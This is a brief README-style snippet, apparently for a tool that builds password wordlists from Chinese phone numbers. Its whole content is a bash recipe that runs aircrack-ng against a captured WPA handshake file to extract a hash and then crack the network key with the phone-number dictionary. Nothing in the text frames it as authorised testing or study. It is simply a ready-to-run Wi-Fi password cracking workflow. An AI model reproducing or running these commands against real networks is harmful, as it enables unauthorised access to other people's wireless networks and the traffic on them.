# Generate dictionary based on Chinese phone number


# Crack cmd
```bash
caps=BC-5F-F6-B2-6B-02_handshake.cap

# Check SSID
aircrack-ng  -J wpahash ${caps}

# Crack
aircrack-ng -l wpakey -w ~/phone_dict_gen/phone.dict ${caps}
```